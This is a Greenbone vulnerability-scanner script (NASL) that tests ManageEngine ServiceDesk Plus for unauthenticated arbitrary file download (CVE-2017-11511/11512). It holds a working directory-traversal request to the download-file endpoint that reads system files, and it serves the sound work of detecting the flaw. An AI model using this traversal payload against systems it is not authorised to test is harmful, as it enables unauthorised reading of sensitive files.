# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:zohocorp:manageengine_servicedesk_plus";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140496");
  script_version("2023-07-14T16:09:27+0000");
  script_tag(name:"last_modification", value:"2023-07-14 16:09:27 +0000 (Fri, 14 Jul 2023)");
  script_tag(name:"creation_date", value:"2017-11-09 15:13:18 +0700 (Thu, 09 Nov 2017)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-09 23:22:00 +0000 (Wed, 09 Oct 2019)");

  script_cve_id("CVE-2017-11511", "CVE-2017-11512");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ManageEngine ServiceDesk Plus Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_manageengine_servicedesk_plus_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("manageengine/servicedesk_plus/detected");

  script_tag(name:"summary", value:"ManageEngine ServiceDesk Plus is prone to multiple arbitrary file download
  vulnerabilities.");

  script_tag(name:"insight", value:"ServiceDesk provides an interface for unauthenticated remote users to
  download files and snapshots. Due to the lack of validation an attacker can use this to traverse directories and
  download arbitrary files.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.tenable.com/security/research/tra-2017-31");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern (keys(files)) {
  file = files[pattern];
  url = dir + '/fosagent/repl/download-file?basedir=4&filepath=' + crap(data: "..\", length: 10*3) + file;
  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
